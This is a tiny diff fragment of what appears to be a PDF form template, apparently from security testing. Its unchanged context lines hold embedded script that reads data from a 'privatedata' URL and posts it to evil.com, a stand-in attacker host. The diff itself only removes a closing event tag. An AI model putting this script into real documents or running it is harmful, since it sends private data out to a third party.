@@ -17,7 +17,6 @@ stream
 var content = Get("http://example.com/privatedata.php");
 Post("http://evil.com/receiver.php",content);
  
- </event>
  </field>
  </subform>
 </template>
